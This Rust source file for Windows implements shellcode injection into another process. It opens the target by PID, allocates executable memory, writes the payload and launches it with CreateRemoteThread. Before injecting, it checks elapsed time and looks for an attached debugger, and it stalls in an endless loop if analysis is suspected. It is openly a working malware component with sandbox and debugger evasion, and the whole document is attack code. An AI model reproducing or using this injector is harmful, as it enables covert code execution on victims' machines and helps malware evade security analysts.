use core::ffi::c_void;
use std::fs::File;
use std::io::{BufReader, Read, Write};
use std::{fs, mem};
use std::time::Instant;
use windows::core::imp::HANDLE;
use windows::Win32::System::Diagnostics::Debug::{CheckRemoteDebuggerPresent, IsDebuggerPresent, WriteProcessMemory};
use windows::Win32::System::Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
use windows::Win32::System::Threading::{CreateRemoteThread, INFINITE, OpenProcess, PROCESS_ALL_ACCESS};
use windows::Win32::System::Threading::WaitForSingleObject;
use windows::Win32::Foundation::{FALSE, BOOL};
use crate::{EPOCH};


pub fn inject_and_migrate(shellcode: &[u8], pid: u32) {
    if pid == 0 { panic!(); }

    // Call OpenProcess to get a handle to the target process via its PID
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.OpenProcess.html
    let process_handle = unsafe {
        match OpenProcess(PROCESS_ALL_ACCESS, false, pid) {
            Ok(value) => value,
            Err(_) => panic!("Could not open a handle to the process"),
        }
    };

    let (epoch, sys) = *EPOCH;
    let now = Instant::now().duration_since(epoch).as_secs();
    if now > 90 || sys.elapsed().expect("").as_secs() > 90 { loop {} }

    let debugging = unsafe{IsDebuggerPresent()};
    if debugging.as_bool() { loop {} }

    let mut result = FALSE;
    unsafe { CheckRemoteDebuggerPresent(process_handle, &mut result) }.expect("");
    if result.as_bool() { loop {}}

    // Call VirtualAllocEx to allocate memory for the shellcode
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Memory/fn.VirtualAllocEx.html
    let base_address = unsafe {
        VirtualAllocEx(
            process_handle,
            None,
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };

    // Call WriteProcessMemory to write the contents of the shellcode into the memory allocated above
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Diagnostics/Debug/fn.WriteProcessMemory.html
    let write_result = unsafe {
        WriteProcessMemory(process_handle, base_address, shellcode.as_ptr() as *const c_void, shellcode.len(), None,)
    };
    if write_result.is_err() { panic!(); }

    // Call CreateRemoteThread to create the execution thread in the target PID
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.CreateRemoteThread.html
    let start_address_option = unsafe { Some(mem::transmute(base_address)) };
    unsafe {
        let t = CreateRemoteThread(process_handle, None, 0, start_address_option, None, 0, None, );
        WaitForSingleObject(t.unwrap(), INFINITE);
    }
}